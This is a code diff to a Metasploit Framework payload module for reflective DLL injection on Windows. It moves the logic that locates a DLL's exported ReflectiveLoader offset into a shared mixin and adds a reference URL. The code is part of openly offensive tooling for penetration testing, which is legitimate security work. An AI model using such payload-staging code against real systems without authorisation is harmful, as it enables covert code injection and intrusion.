@@ -1,7 +1,7 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
-require 'rex/peparsey'
+require 'msf/core/reflective_dll_loader'
 
 module Msf
 
@@ -15,6 +15,7 @@ module Msf
 
 module Payload::Windows::ReflectiveDllInject
 
+  include Msf::ReflectiveDLLLoader
   include Msf::Payload::Windows
 
   def initialize(info = {})
@@ -24,7 +25,10 @@ module Payload::Windows::ReflectiveDllInject
             'Name'          => 'Reflective DLL Injection',
             'Description'   => 'Inject a DLL via a reflective loader',
             'Author'        => [ 'sf' ],
-            'References'    => [ [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ] ],
+            'References'    => [
+                [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ], # original
+                [ 'URL', 'https://github.com/rapid7/ReflectiveDLLInjection' ] # customisations
+            ],
             'Platform'      => 'Windows',
             'Arch'          => ARCH_X86,
             'PayloadCompat' =>
@@ -50,26 +54,8 @@ module Payload::Windows::ReflectiveDllInject
   end
 
   def stage_payload(target_id=nil)
-    dll    = ""
-    offset = 0
-
-    begin
-      File.open( library_path, "rb" ) { |f| dll += f.read(f.stat.size) }
-
-      pe = Rex::PeParsey::Pe.new( Rex::ImageSource::Memory.new( dll ) )
-
-      pe.exports.entries.each do |entry|
-        if( entry.name =~ /^\S*ReflectiveLoader\S*/ )
-          offset = pe.rva_to_file_offset( entry.rva )
-          break
-        end
-      end
-
-      raise "Can't find an exported ReflectiveLoader function!" if offset == 0
-    rescue
-      print_error( "Failed to read and parse Dll file: #{$!}" )
-      return
-    end
+    # Exceptions will be thrown by the mixin if there are issues.
+    dll, offset = load_rdi_dll(library_path)
 
     exit_funk = [ EXIT_FUNCTION_ADDRESS_BY_TECHNIQUE[DEFAULT_EXIT_TECHNIQUE] ].pack( "V" )
 
